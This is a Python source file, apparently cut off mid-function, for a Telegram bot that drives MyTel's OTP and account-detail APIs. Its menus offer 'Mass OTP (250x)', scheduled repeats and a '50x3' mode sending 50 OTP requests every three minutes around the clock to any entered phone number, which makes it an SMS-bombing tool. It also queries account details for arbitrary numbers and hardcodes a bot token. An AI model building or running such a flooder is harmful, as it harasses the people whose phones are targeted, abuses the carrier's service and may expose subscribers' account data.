import requests
import logging
import json
import asyncio
import re
import os
from threading import Thread
from flask import Flask
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler, ConversationHandler,
    MessageHandler, filters, ContextTypes
)

# ------------------ Configuration ------------------
BOT_TOKEN = "8639161558:AAG7Wuy-jesOQEnxFpF8bO3mCTTAUYaFdc4"   # <-- REPLACE WITH YOUR NEW TOKEN

# ---------- Health check server (keeps Render awake) ----------
health_app = Flask(__name__)

@health_app.route('/')
def health():
    return "Bot is alive", 200

def run_health_server():
    health_app.run(host='0.0.0.0', port=8080)

Thread(target=run_health_server, daemon=True).start()

# API Endpoints
GET_OTP_URL = "https://apis.mytel.com.mm/myid/authen/v1.0/login/method/otp/get-otp"
VALIDATE_OTP_URL = "https://apis.mytel.com.mm/myid/authen/v1.0/login/method/otp/validate-otp"
ACCOUNT_DETAIL_URL = "https://apis.mytel.com.mm/account-detail/api/v1.2/individual/account-main"

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36",
    "Content-Type": "application/json",
    "Accept": "application/json",
}

logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

# Conversation states
(WAITING_PHONE, WAITING_OTP, WAITING_ISDN,
 WAITING_SCHEDULE_PHONE, WAITING_SCHEDULE_COUNT, WAITING_SCHEDULE_INTERVAL,
 WAITING_MASS_PHONE, WAITING_SCHEDULE_TYPE, WAITING_SCHEDULE_DAYS,
 WAITING_SCHEDULE_WEEK_INTERVAL, WAITING_SCHEDULE_TIME, WAITING_SCHEDULE_CUSTOM,
 WAITING_50X3_PHONE) = range(13)

# Days of week mapping
DAYS_OF_WEEK = {
    "monday": 0, "mon": 0,
    "tuesday": 1, "tue": 1,
    "wednesday": 2, "wed": 2,
    "thursday": 3, "thu": 3,
    "friday": 4, "fri": 4,
    "saturday": 5, "sat": 5,
    "sunday": 6, "sun": 6
}

# ------------------ Helper Functions ------------------
def escape_markdown(text: str) -> str:
    """Escape special characters for MarkdownV2."""
    special_chars = r'_*[]()~`>#+-=|{}.!'
    return re.sub(f'([{re.escape(special_chars)}])', r'\\\1', text)

def parse_time_string(time_str: str) -> tuple[int, int]:
    """Parse time string like '14:30' or '2:30 PM' to (hour, minute)."""
    time_str = time_str.strip().lower()
    
    # Handle 24-hour format
    if ':' in time_str:
        parts = time_str.split(':')
        if len(parts) == 2:
            hour = int(parts[0])
            minute = int(parts[1].split()[0]) if parts[1].split() else int(parts[1])
            
            # Check for AM/PM
            if 'pm' in time_str and hour != 12:
                hour += 12
            elif 'am' in time_str and hour == 12:
                hour = 0
            return hour, minute
    
    # Handle simple hour
    hour = int(time_str)
    return hour, 0

def parse_interval_string(interval_str: str) -> dict:
    """Parse complex interval like '2w 3d 4h 30m' or 'weekly' or 'daily'."""
    interval_str = interval_str.lower().strip()
    
    # Handle common shortcuts
    shortcuts = {
        'minutely': {'minutes': 1},
        'hourly': {'hours': 1},
        'daily': {'days': 1},
        'weekly': {'weeks': 1},
        'monthly': {'weeks': 4}
    }
    
    if interval_str in shortcuts:
        return shortcuts[interval_str]
    
    # Parse complex string
    result = {'weeks': 0, 'days': 0, 'hours': 0, 'minutes': 0}
    
    # Find all patterns
    patterns = [
        (r'(\d+)\s*w', 'weeks'),
        (r'(\d+)\s*week', 'weeks'),
        (r'(\d+)\s*d', 'days'),
        (r'(\d+)\s*day', 'days'),
        (r'(\d+)\s*h', 'hours'),
        (r'(\d+)\s*hour', 'hours'),
        (r'(\d+)\s*m', 'minutes'),
        (r'(\d+)\s*minute', 'minutes')
    ]
    
    for pattern, key in patterns:
        match = re.search(pattern, interval_str)
        if match:
            result[key] = int(match.group(1))
    
    return result

def calculate_total_seconds(interval_dict: dict) -> int:
    """Convert interval dict to total seconds."""
    return (interval_dict['weeks'] * 7 * 24 * 3600 +
            interval_dict['days'] * 24 * 3600 +
            interval_dict['hours'] * 3600 +
            interval_dict['minutes'] * 60)

# ------------------ API Functions ------------------
async def request_otp(phone_number: str) -> tuple[bool, str]:
    params = {"phoneNumber": phone_number}
    try:
        resp = requests.get(GET_OTP_URL, params=params, headers=HEADERS, timeout=10)
        if resp.status_code == 200:
            return True, "✅ OTP request sent successfully. Check your SMS."
        else:
            return False, f"❌ Failed (HTTP {resp.status_code}): {resp.text[:100]}"
    except Exception as e:
        logger.exception("request_otp error")
        return False, f"❌ Network error: {str(e)}"

async def validate_otp(phone_number: str, otp_code: str) -> tuple[bool, dict | str]:
    payload = {"phoneNumber": phone_number, "service": "mytel", "otp": otp_code}
    try:
        resp = requests.post(VALIDATE_OTP_URL, json=payload, headers=HEADERS, timeout=10)
        if resp.status_code == 200:
            return True, resp.json()
        else:
            return False, f"❌ Validation failed (HTTP {resp.status_code}): {resp.text[:100]}"
    except Exception as e:
        logger.exception("validate_otp error")
        return False, f"❌ Network error: {str(e)}"

async def get_account_details(isdn: str, language: str = "en") -> tuple[bool, dict | str]:
    params = {"isdn": isdn, "language": language}
    try:
        resp = requests.get(ACCOUNT_DETAIL_URL, params=params, headers=HEADERS, timeout=10)
        if resp.status_code == 200:
            return True, resp.json()
        else:
            return False, f"❌ Account detail error (HTTP {resp.status_code}): {resp.text[:100]}"
    except Exception as e:
        logger.exception("get_account_details error")
        return False, f"❌ Network error: {str(e)}"

# ------------------ Keyboards ------------------
def simple_keyboard():
    buttons = [
        ["📱 Request OTP", "✅ Validate OTP"],
        ["📄 Account Details", "⏰ Schedule OTP"],
        ["🔄 Mass OTP (250x)", "📅 Advanced Schedule"],
        ["⚡ 50x3 (50 codes/3min)", "🛑 Stop Task"],
        ["❓ Help", "🔘 Inline Menu"]
    ]
    return ReplyKeyboardMarkup(buttons, resize_keyboard=True, is_persistent=True)

def inline_menu_keyboard():
    keyboard = [
        [InlineKeyboardButton("📱 Request OTP (Single)", callback_data="single_otp")],
        [InlineKeyboardButton("✅ Validate OTP", callback_data="validate_otp")],
        [InlineKeyboardButton("📄 Account Details", callback_data="account_details")],
        [InlineKeyboardButton("⏰ Schedule OTP", callback_data="schedule_otp")],
        [InlineKeyboardButton("📅 Advanced Schedule", callback_data="advanced_schedule")],
        [InlineKeyboardButton("🔄 Mass OTP (250x)", callback_data="mass_otp")],
        [InlineKeyboardButton("⚡ 50x3 (50 codes/3min)", callback_data="fifty_x_three")],
        [InlineKeyboardButton("🛑 Stop Task", callback_data="stop_task")],
        [InlineKeyboardButton("❓ Help", callback_data="help")]
    ]
    return InlineKeyboardMarkup(keyboard)

def schedule_type_keyboard():
    keyboard = [
        [InlineKeyboardButton("⏰ Simple (Seconds/Minutes)", callback_data="simple_schedule")],
        [InlineKeyboardButton("📅 Advanced (Weeks/Days)", callback_data="advanced_schedule")],
        [InlineKeyboardButton("⚡ Custom (Weeks/Days/Hours/Minutes)", callback_data="custom_schedule")],
        [InlineKeyboardButton("🔙 Back to Menu", callback_data="back_to_menu")]
    ]
    return InlineKeyboardMarkup(keyboard)

def days_selection_keyboard():
    keyboard = [
        [InlineKeyboardButton("Monday", callback_data="day_mon"),
         InlineKeyboardButton("Tuesday", callback_data="day_tue"),
         InlineKeyboardButton("Wednesday", callback_data="day_wed")],
        [InlineKeyboardButton("Thursday", callback_data="day_thu"),
         InlineKeyboardButton("Friday", callback_data="day_fri"),
         InlineKeyboardButton("Saturday", callback_data="day_sat")],
        [InlineKeyboardButton("Sunday", callback_data="day_sun"),
         InlineKeyboardButton("✅ Done", callback_data="days_done")],
        [InlineKeyboardButton("🔙 Back", callback_data="back_to_schedule_type")]
    ]
    return InlineKeyboardMarkup(keyboard)

# ------------------ Telegram Handlers ------------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Welcome to MyTel OTP Bot 🤖\n\nUse the buttons below to choose an action.",
        reply_markup=simple_keyboard()
    )

async def handle_simple_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    if text == "📱 Request OTP":
        return await single_otp_start_simple(update, context)
    elif text == "✅ Validate OTP":
        return await validate_otp_start_simple(update, context)
    elif text == "📄 Account Details":
        return await account_details_start_simple(update, context)
    elif text == "⏰ Schedule OTP":
        return await schedule_type_selection(update, context)
    elif text == "📅 Advanced Schedule":
        return await advanced_schedule_start(update, context)
    elif text == "🔄 Mass OTP (250x)":
        return await mass_otp_start(update, context)
    elif text == "⚡ 50x3 (50 codes/3min)":
        return await fifty_x_three_start(update, context)
    elif text == "🛑 Stop Task":
        await stop_task(update, context)
        return ConversationHandler.END
    elif text == "❓ Help":
        await help_simple(update, context)
        return ConversationHandler.END
    elif text == "🔘 Inline Menu":
        await update.message.reply_text(
            "Here is the inline keyboard:",
            reply_markup=inline_menu_keyboard()
        )
        return ConversationHandler.END
    else:
        await update.message.reply_text("Unknown command. Use the buttons below.", reply_markup=simple_keyboard())
        return ConversationHandler.END

async def help_simple(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📖 Help Menu\n\n"
        "• Request OTP – One OTP request.\n"
        "• Validate OTP – Verify an OTP code.\n"
        "• Account Details – Fetch account info.\n"
        "• Schedule OTP – Auto OTP at intervals.\n"
        "• Advanced Schedule – Schedule on specific days/times.\n"
        "• Mass OTP (250x) – Send 250 OTP requests in a row.\n"
        "• 50x3 (50 codes/3min) – Send 50 OTP codes every 3 minutes, daily reset!\n"
        "• Stop Task – Stop any running task.\n\n"
        "50x3 Feature:\n"
        "- Sends 50 OTP codes every 3 minutes\n"
        "- Automatically resets at midnight\n"
        "- Runs daily continuously\n"
        "- Can be stopped with Stop Task button\n\n"
        "Schedule Examples:\n"
        "- Simple: '30' (every 30 seconds)\n"
        "- Custom: '2w 3d 4h 30m' (every 2 weeks, 3 days, 4 hours, 30 minutes)\n"
        "- Shortcuts: 'daily', 'weekly', 'hourly', 'minutely'\n"
        "- With time: 'daily at 14:30' (every day at 2:30 PM)",
        reply_markup=simple_keyboard()
    )

# ---------- Schedule Type Selection ----------
async def schedule_type_selection(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.callback_query:
        query = update.callback_query
        await query.answer()
        await query.edit_message_text(
            "Select schedule type:",
            reply_markup=schedule_type_keyboard()
        )
        return WAITING_SCHEDULE_TYPE
    else:
        await update.message.reply_text(
            "Select schedule type:",
            reply_markup=schedule_type_keyboard()
        )
        return WAITING_SCHEDULE_TYPE

async def handle_schedule_type(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    
    if data == "simple_schedule":
        await query.edit_message_text(
            "⏰ Simple Schedule (Seconds/Minutes)\n\n"
            "Send the phone number (example: 95912345678).\n"
            "Type /cancel to abort."
        )
        context.user_data["schedule_mode"] = "simple"
        return WAITING_SCHEDULE_PHONE
    elif data == "advanced_schedule":
        await query.edit_message_text(
            "📅 Advanced Schedule (Days of Week)\n\n"
            "Send the phone number (example: 95912345678).\n"
            "Type /cancel to abort."
        )
        context.user_data["schedule_mode"] = "advanced"
        return WAITING_SCHEDULE_PHONE
    elif data == "custom_schedule":
        await query.edit_message_text(
            "⚡ Custom Schedule (Weeks/Days/Hours/Minutes)\n\n"
            "Send the phone number (example: 95912345678).\n"
            "Type /cancel to abort."
        )
        context.user_data["schedule_mode"] = "custom"
        return WAITING_SCHEDULE_PHONE
    elif data == "back_to_menu":
        await query.edit_message_text(
            "Main menu:",
            reply_markup=inline_menu_keyboard()
        )
        return ConversationHandler.END

# ---------- Single OTP ----------
async def single_otp_start_simple(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📞 Please send the phone number (example: 95912345678).\nType /cancel to abort."
    )
    return WAITING_PHONE

# ---------- Validate OTP ----------
async def validate_otp_start_simple(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📞 Send the phone number first (example: 95912345678).\nType /cancel to abort."
    )
    return WAITING_PHONE

# ---------- Account Details ----------
async def account_details_start_simple(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📄 Send the ISDN (example: +95912345678 or 95912345678).\nType /cancel to abort."
    )
    return WAITING_ISDN

# ---------- Schedule OTP - Phone Number ----------
async def schedule_phone_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = update.message.text.strip()
    context.user_data["schedule_phone"] = phone
    await update.message.reply_text(
        "🔢 How many times should the OTP be requested?\n"
        "(Enter a number, example: 5, or 0 for unlimited)"
    )
    return WAITING_SCHEDULE_COUNT

async def schedule_count_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        count = int(update.message.text.strip())
        if count < 0:
            raise ValueError
    except ValueError:
        await update.message.reply_text("❌ Please enter a positive integer (or 0 for unlimited).")
        return WAITING_SCHEDULE_COUNT
    context.user_data["schedule_count"] = count
    
    mode = context.user_data.get("schedule_mode", "simple")
    
    if mode == "simple":
        await update.message.reply_text(
            "⏱️ What interval between requests?\n"
            "Send as seconds (example: 30) or minutes (example: 2m)\n"
            "Also accepts: 'hourly', 'daily', 'minutely'\n"
            "Example: 60, 5m, hourly"
        )
        return WAITING_SCHEDULE_INTERVAL
    elif mode == "advanced":
        await update.message.reply_text(
            "Select days of the week:",
            reply_markup=days_selection_keyboard()
        )
        return WAITING_SCHEDULE_DAYS
    elif mode == "custom":
        await update.message.reply_text(
            "⚡ Custom Interval\n\n"
            "Enter interval (examples):\n"
            "- '2w 3d 4h 30m' (2 weeks, 3 days, 4 hours, 30 minutes)\n"
            "- 'daily' (every day)\n"
            "- 'weekly' (every week)\n"
            "- 'hourly' (every hour)\n"
            "- '2h 30m' (every 2 hours 30 minutes)\n\n"
            "Optional: Add time of day - 'daily at 14:30' or 'weekly at 9:00 AM'"
        )
        return WAITING_SCHEDULE_CUSTOM

# ---------- Simple Schedule Interval ----------
async def schedule_interval_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
    interval_str = update.message.text.strip().lower()
    
    # Check for time specification
    time_spec = None
    if " at " in interval_str:
        parts = interval_str.split(" at ")
        interval_str = parts[0]
        time_spec = parts[1]
    
    # Parse interval
    interval_dict = parse_interval_string(interval_str)
    total_seconds = calculate_total_seconds(interval_dict)
    
    if total_seconds == 0:
        # Try simple seconds
        try:
            total_seconds = int(interval_str)
            if total_seconds <= 0:
                raise ValueError
        except ValueError:
            await update.message.reply_text(
                "❌ Invalid interval. Examples:\n"
                "- '30' (30 seconds)\n"
                "- '5m' (5 minutes)\n"
                "- 'hourly' (1 hour)\n"
                "- 'daily' (24 hours)"
            )
            return WAITING_SCHEDULE_INTERVAL
    
    if total_seconds < 2:
        await update.message.reply_text("⚠️ Interval too short. Minimum 2 seconds.")
        return WAITING_SCHEDULE_INTERVAL
    
    phone = context.user_data.get("schedule_phone")
    count = context.user_data.get("schedule_count")
    
    if not phone:
        await update.message.reply_text("Session expired. Start over.", reply_markup=simple_keyboard())
        return ConversationHandler.END
    
    # Parse time if specified
    target_hour, target_minute = None, None
    if time_spec:
        try:
            target_hour, target_minute = parse_time_string(time_spec)
        except:
            await update.message.reply_text("❌ Invalid time format. Use HH:MM or HH:MM AM/PM")
            return WAITING_SCHEDULE_INTERVAL
    
    # Start background task
    task = asyncio.create_task(
        run_scheduled_otp_advanced(
            user_id=update.effective_user.id,
            phone=phone,
            total=count,
            interval_seconds=total_seconds,
            interval_dict=interval_dict,
            target_hour=target_hour,
            target_minute=target_minute,
            context=context
        )
    )
    context.user_data["scheduled_task"] = task
    context.user_data["stop_task_flag"] = False
    
    interval_text = f"every {total_seconds} seconds"
    if time_spec:
        interval_text += f" at {time_spec}"
    
    count_text = "unlimited" if count == 0 else f"{count} times"
    
    await update.message.reply_text(
        f"✅ Scheduled! Will request OTP for {phone} {count_text} {interval_text}\n"
        f"You will receive a report after each attempt.\n"
        f"To stop early, use Stop Task button or /stop_task.",
        reply_markup=simple_keyboard()
    )
    return ConversationHandler.END

# ---------- Advanced Schedule (Days of Week) ----------
async def advanced_schedule_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.callback_query:
        query = update.callback_query
        await query.answer()
        await query.edit_message_text(
            "📅 Advanced Schedule (Days of Week)\n\n"
            "Send the phone number (example: 95912345678).\n"
            "Type /cancel to abort."
        )
        context.user_data["schedule_mode"] = "advanced"
    else:
        await update.message.reply_text(
            "📅 Advanced Schedule (Days of Week)\n\n"
            "Send the phone number (example: 95912345678).\n"
            "Type /cancel to abort."
        )
        context.user_data["schedule_mode"] = "advanced"
    return WAITING_SCHEDULE_PHONE

async def handle_days_selection(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    
    if data == "back_to_schedule_type":
        await query.edit_message_text(
            "Select schedule type:",
            reply_markup=schedule_type_keyboard()
        )
        return WAITING_SCHEDULE_TYPE
    
    if data == "days_done":
        selected_days = context.user_data.get("selected_days", [])
        if not selected_days:
            await query.answer("Please select at least one day!", show_alert=True)
            return WAITING_SCHEDULE_DAYS
        
        days_text = ", ".join(selected_days)
        await query.edit_message_text(
            f"Selected days: {days_text}\n\n"
            "How many weeks between each execution?\n"
            "(Enter 1 for every week, 2 for every 2 weeks, etc.)\n"
            "Example: 1\n\n"
            "Optional: Add time of day (example: '1 at 14:30' or '2 at 9:00 AM')"
        )
        return WAITING_SCHEDULE_WEEK_INTERVAL
    
    # Handle day selection
    day_map = {
        "day_mon": "Monday", "day_tue": "Tuesday", "day_wed": "Wednesday",
        "day_thu": "Thursday", "day_fri": "Friday", "day_sat": "Saturday",
        "day_sun": "Sunday"
    }
    
    if data in day_map:
        day_name = day_map[data]
        selected_days = context.user_data.get("selected_days", [])
        if day_name in selected_days:
            selected_days.remove(day_name)
        else:
            selected_days.append(day_name)
        context.user_data["selected_days"] = selected_days
        
        days_text = ", ".join(selected_days) if selected_days else "None"
        await query.edit_message_text(
            f"Select days of the week:\n\nSelected: {days_text}\n\nClick 'Done' when finished.",
            reply_markup=days_selection_keyboard()
        )
        return WAITING_SCHEDULE_DAYS

async def advanced_schedule_week_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip().lower()
    
    # Parse week interval and optional time
    week_interval = 1
    time_spec = None
    
    if " at " in text:
        parts = text.split(" at ")
        try:
            week_interval = int(parts[0])
            time_spec = parts[1]
        except:
            await update.message.reply_text("❌ Invalid format. Use: '1 at 14:30' or just '1'")
            return WAITING_SCHEDULE_WEEK_INTERVAL
    else:
        try:
            week_interval = int(text)
        except:
            await update.message.reply_text("❌ Please enter a number (1, 2, 3, etc.)")
            return WAITING_SCHEDULE_WEEK_INTERVAL
    
    if week_interval <= 0:
        await update.message.reply_text("❌ Please enter a positive integer.")
        return WAITING_SCHEDULE_WEEK_INTERVAL
    
    phone = context.user_data.get("schedule_phone")
    count = context.user_data.get("schedule_count")
    selected_days = context.user_data.get("selected_days", [])
    
    if not phone or not count or not selected_days:
        await update.message.reply_text("Session expired. Start over.", reply_markup=simple_keyboard())
        return ConversationHandler.END
    
    # Parse time if specified
    target_hour, target_minute = None, None
    if time_spec:
        try:
            target_hour, target_minute = parse_time_string(time_spec)
        except:
            await update.message.reply_text("❌ Invalid time format. Use HH:MM or HH:MM AM/PM")
            return WAITING_SCHEDULE_WEEK_INTERVAL
    
    # Start advanced scheduled task
    task = asyncio.create_task(
        run_advanced_scheduled_otp(
            user_id=update.effective_user.id,
            phone=phone,
            count_per_day=count,
            days=selected_days,
            week_interval=week_interval,
            target_hour=target_hour,
            target_minute=target_minute,
            context=context
        )
    )
    context.user_data["scheduled_task"] = task
    context.user_data["stop_task_flag"] = False
    
    time_text = f" at {time_spec}" if time_spec else " (immediately on scheduled days)"
    
    await update.message.reply_text(
        f"✅ Advanced Schedule configured!\n\n"
        f"Phone: {phone}\n"
        f"Requests per day: {count if count > 0 else 'unlimited'}\n"
        f"Days: {', '.join(selected_days)}\n"
        f"Every {week_interval} week(s){time_text}\n\n"
        f"The bot will automatically send OTP requests on scheduled days.\n"
        f"Use Stop Task button or /stop_task to cancel.",
        reply_markup=simple_keyboard()
    )
    return ConversationHandler.END

# ---------- Custom Schedule (Weeks/Days/Hours/Minutes) ----------
async def custom_schedule_interval_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
    interval_str = update.message.text.strip().lower()
    
    # Check for time specification
    time_spec = None
    if " at " in interval_str:
        parts = interval_str.split(" at ")
        interval_str = parts[0]
        time_spec = parts[1]
    
    # Parse interval
    interval_dict = parse_interval_string(interval_str)
    total_seconds = calculate_total_seconds(interval_dict)
    
    if total_seconds == 0:
        await update.message.reply_text(
            "❌ Invalid interval. Examples:\n"
            "- '2w 3d 4h 30m' (2 weeks, 3 days, 4 hours, 30 minutes)\n"
            "- 'daily' (every day)\n"
            "- 'weekly' (every week)\n"
            "- '2h 30m' (every 2 hours 30 minutes)\n"
            "- '30m' (every 30 minutes)"
        )
        return WAITING_SCHEDULE_CUSTOM
    
    if total_seconds < 2:
        await update.message.reply_text("⚠️ Interval too short. Minimum 2 seconds.")
        return WAITING_SCHEDULE_CUSTOM
    
    phone = context.user_data.get("schedule_phone")
    count = context.user_data.get("schedule_count")
    
    if not phone:
        await update.message.reply_text("Session expired. Start over.", reply_markup=simple_keyboard())
        return ConversationHandler.END
    
    # Parse time if specified
    target_hour, target_minute = None, None
    if time_spec:
        try:
            target_hour, target_minute = parse_time_string(time_spec)
        except:
            await update.message.reply_text("❌ Invalid time format. Use HH:MM or HH:MM AM/PM")
            return WAITING_SCHEDULE_CUSTOM
    
    # Start background task
    task = asyncio.create_task(
        run_scheduled_otp_advanced(
            user_id=update.effective_user.id,
            phone=phone,
            total=count,
            interval_seconds=total_seconds,
            interval_dict=interval_dict,
            target_hour=target_hour,
            target_minute=target_minute,
            context=context
        )
    )
    context.user_data["scheduled_task"] = task
    context.user_data["stop_task_flag"] = False
    
    # Format interval text nicely
    interval_parts = []
    if interval_dict['weeks'] > 0:
        interval_parts.append(f"{interval_dict['weeks']} week(s)")
    if interval_dict['days'] > 0:
        interval_parts.append(f"{interval_dict['days']} day(s)")
    if interval_dict['hours'] > 0:
        interval_parts.append(f"{interval_dict['hours']} hour(s)")
    if interval_dict['minutes'] > 0:
        interval_parts.append(f"{interval_dict['minutes']} minute(s)")
    
    interval_text = "every " + " ".join(interval_parts)
    if time_spec:
        interval_text += f" at {time_spec}"
    
    count_text = "unlimited" if count == 0 else f"{count} times"
    
    await update.message.reply_text(
        f"✅ Scheduled! Will request OTP for {phone} {count_text} {interval_text}\n"
        f"You will receive a report after each attempt.\n"
        f"To stop early, use Stop Task button or /stop_task.",
        reply_markup=simple_keyboard()
    )
    return ConversationHandler.END

# ---------- 50x3 Feature (50 codes every 3 minutes, daily reset) ----------
async def fifty_x_three_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.callback_query:
        query = update.callback_query
        await query.answer()
        await query.edit_message_text(
            "⚡ 50x3 Feature\n\n"
            "Send 50 OTP codes every 3 minutes!\n"
            "• Automatically resets at midnight\n"
            "• Runs continuously every day\n"
            "• Can be stopped with Stop Task button\n\n"
            "Send the phone number (example: 95912345678).\n"
            "Type /cancel to abort."
        )
    else:
        await update.message.reply_text(
            "⚡ 50x3 Feature\n\n"
            "Send 50 OTP codes every 3 minutes!\n"
            "• Automatically resets at midnight\n"
            "• Runs continuously every day\n"
            "• Can be stopped with Stop Task button\n\n"
            "Send the phone number (example: 95912345678).\n"
            "Type /cancel to abort."
        )
    return WAITING_50X3_PHONE

async def receive_fifty_x_three_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = update.message.text.strip()
    context.user_data["fifty_x_three_phone"] = phone
    
    await update.message.reply_text(
        f"⚡ Starting 50x3 OTP Service for {phone}\n\n"
        f"📊 Configuration:\n"
        f"• 50 OTP codes every 3 minutes (180 seconds)\n"
        f"• Daily reset at midnight\n"
        f"• Runs continuously\n"
        f"• Total per day: 24,000 OTP codes (50 * 480 cycles)\n\n"
        f"Starting first batch now...\n"
        f"Use Stop Task button or /stop_task to stop.",
        reply_markup=simple_keyboard()
    )
    
    # Start the 50x3 background task
    task = asyncio.create_task(
        run_fifty_x_three_otp(
            user_id=update.effective_user.id,
            phone=phone,
            context=context
        )
    )
    context.user_data["fifty_x_three_task"] = task
    context.user_data["stop_task_flag"] = False
    
    return ConversationHandler.END

async def run_fifty_x_three_otp(user_id: int, phone: str, context: ContextTypes.DEFAULT_TYPE):
    """Background task: Send 50 OTP codes every 3 minutes, reset at midnight."""
    total_per_cycle = 50
    cycle_interval = 180  # 3 minutes in seconds
    daily_reset = True
    
    # Track current date for reset
    current_date = datetime.now().date()
    cycle_count = 0
    total_sent = 0
    
    while not context.user_data.get("stop_task_flag"):
        # Check for midnight reset
        now = datetime.now()
        if daily_reset and now.date() != current_date:
            current_date = now.date()
            cycle_count = 0
            total_sent = 0
            await context.bot.send_message(
                chat_id=user_id,
                text=f"🔄 Daily reset at midnight! Starting fresh cycle for {phone}"
            )
        
        cycle_count += 1
        await context.bot.send_message(
            chat_id=user_id,
            text=f"📦 Cycle #{cycle_count} - Sending {total_per_cycle} OTP codes for {phone}..."
        )
        
        # Send 50 OTP codes in this cycle
        for i in range(1, total_per_cycle + 1):
            if context.user_data.get("stop_task_flag"):
                await context.bot.send_message(
                    chat_id=user_id,
                    text=f"🛑 50x3 Service stopped after {total_sent} OTP codes sent."
                )
                return
            
            success, msg = await request_otp(phone)
            status = "✅" if success else "❌"
            total_sent += 1
            
            # Send progress update every 10 codes to avoid spam
            if i % 10 == 0 or i == total_per_cycle:
                await context.bot.send_message(
                    chat_id=user_id,
                    text=f"{status} OTP #{i}/{total_per_cycle} in cycle #{cycle_count} | Total today: {total_sent}\n{msg}"
                )
            else:
                # Send minimal update
                await context.bot.send_message(
                    chat_id=user_id,
                    text=f"{status} OTP #{i}/{total_per_cycle} for {phone}"
                )
            
            # Small delay between requests within the cycle
            await asyncio.sleep(1)
        
        # Send cycle completion summary
        await context.bot.send_message(
            chat_id=user_id,
            text=f"✅ Cycle #{cycle_count} completed!\n"
                 f"📊 Sent {total_per_cycle} OTP codes for {phone}\n"
                 f"📈 Total today: {total_sent} OTP codes\n"
                 f"⏰ Next cycle in 3 minutes..."
        )
        
        # Wait 3 minutes before next cycle
        for _ in range(cycle_interval):
            if context.user_data.get("stop_task_flag"):
                await context.bot.send_message(
                    chat_id=user_id,
                    text=f"🛑 50x3 Service stopped after {total_sent} OTP codes sent."
                )
                return
            await asyncio.sleep(1)
    
    await context.bot.send_message(
        chat_id=user_id,
        text=f"🛑 50x3 Service stopped for {phone}. Total sent: {total_sent} OTP codes."
    )

# ---------- Background Tasks ----------
async def run_scheduled_otp_advanced(user_id: int, phone: str, total: int,
                                      interval_seconds: int, interval_dict: dict,
                                      target_hour: int, target_minute: int,
                                      context: ContextTypes.DEFAULT_TYPE):
    """Background task for advanced scheduling with time constraints."""
    count = 0
    
    while not context.user_data.get("stop_task_flag"):
        # Check if we should run now (based on time of day if specified)
        should_run = True
        
        if target_hour is not None:
            now = datetime.now()
            if now.hour != target_hour or now.minute != target_minute:
                should_run = False
                # Sleep until next minute to check again
                await asyncio.sleep(60)
                continue
        
        if should_run:
            # Check if unlimited or within limit
            if total == 0 or count < total:
                success, msg = await request_otp(phone)
                status = "✅" if success else "❌"
                await context.bot.send_message(
                    chat_id=user_id,
                    text=f"{status} OTP #{count + 1} for {phone}:\n{msg}"
                )
                count += 1
                
                if total > 0 and count >= total:
                    await context.bot.send_message(
                        chat_id=user_id,
                        text=f"✅ Scheduled OTP completed: {total} requests sent for {phone}."
                    )
                    return
            else:
                await context.bot.send_message(
                    chat_id=user_id,
                    text=f"✅ Scheduled OTP completed: {total} requests sent for {phone}."
                )
                return
        
        # Sleep for the interval
        await asyncio.sleep(interval_seconds)

async def run_advanced_scheduled_otp(user_id: int, phone: str, count_per_day: int,
                                      days: list, week_interval: int,
                                      target_hour: int, target_minute: int,
                                      context: ContextTypes.DEFAULT_TYPE):
    """Background task for advanced scheduling on specific days."""
    day_numbers = [DAYS_OF_WEEK[day.lower()] for day in days]
    
    while not context.user_data.get("stop_task_flag"):
        now = datetime.now()
        current_day = now.weekday()
        current_date = now.date()
        
        # Check if today is a scheduled day
        if current_day in day_numbers:
            # Check if we should run this week based on week interval
            weeks_since_epoch = current_date.toordinal() // 7
            if weeks_since_epoch % week_interval == 0:
                # Check time of day if specified
                if target_hour is not None:
                    if now.hour == target_hour and now.minute >= target_minute:
                        await execute_daily_otp(user_id, phone, count_per_day, context)
                        await asyncio.sleep(86400)  # Sleep 24 hours
                    else:
                        await asyncio.sleep(60)  # Check every minute
                else:
                    await execute_daily_otp(user_id, phone, count_per_day, context)
                    await asyncio.sleep(86400)
            else:
                await asyncio.sleep(86400)
        else:
            await asyncio.sleep(3600)  # Check every hour
    
    await context.bot.send_message(
        chat_id=user_id,
        text="🛑 Advanced schedule stopped."
    )

async def execute_daily_otp(user_id: int, phone: str, count_per_day: int,
                             context: ContextTypes.DEFAULT_TYPE):
    """Execute OTP requests for a scheduled day."""
    total = count_per_day if count_per_day > 0 else 250
    
    for i in range(1, total + 1):
        if context.user_data.get("stop_task_flag"):
            await context.bot.send_message(
                chat_id=user_id,
                text=f"🛑 Schedule stopped after {i-1} requests today."
            )
            return
        
        success, msg = await request_otp(phone)
        status = "✅" if success else "❌"
        await context.bot.send_message(
            chat_id=user_id,
            text=f"{status} OTP #{i}/{total} for {phone}:\n{msg}"
        )
        await asyncio.sleep(2)  # 2 second delay between requests

# ---------- Mass OTP (250x) ----------
async def mass_otp_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
